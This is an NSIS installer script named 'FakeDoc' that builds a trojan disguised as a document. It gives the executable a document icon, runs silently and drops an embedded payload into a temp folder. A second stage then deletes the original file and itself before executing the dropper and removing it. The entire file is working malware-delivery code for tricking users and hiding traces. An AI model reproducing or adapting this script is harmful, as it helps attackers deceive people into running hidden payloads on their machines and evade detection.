
   /*************\
   *             *
   *   FakeDoc   *
   *             *
   \*************/

; Defines:
; --------
; TYPE
; OUTPUT
; DROPPER

!include 'FileFunc.nsh'
!include 'LogicLib.nsh'

Name ""
Icon "resources\${TYPE}.ico"
OutFile "${OUTPUT}"

RequestExecutionLevel user

Var argv
Var stage1
Var stage2
Var dropper

Function .onInit

   SetSilent silent

FunctionEnd

Function un.onInit

   SetSilent silent

FunctionEnd

Section "Install"

   GetTempFileName $0
   StrCpy $stage2 "$0.1.exe"
   GetTempFileName $0
   StrCpy $dropper "$0.2.exe"

   WriteUninstaller "$stage2"
   File "/oname=$dropper" "${DROPPER}"

   Exec '"$stage2" /o1 "$EXEPATH" /o2 "$stage2" /o3 "$dropper"'

SectionEnd

Section "Uninstall"

   ${GetParameters} $argv
   ${GetOptions} "$argv" "/o1" $stage1
   ${GetOptions} "$argv" "/o2" $stage2
   ${GetOptions} "$argv" "/o3" $dropper

   ${Do}
      ClearErrors
      Delete "$stage1"
      IfErrors +2
      ${Break}
      Sleep 300
   ${Loop}

   ${Do}
      ClearErrors
      Delete "$stage2"
      IfErrors +2
      ${Break}
      Sleep 300
   ${Loop}

   ExecWait '"$dropper"'
   Delete "$dropper"

SectionEnd
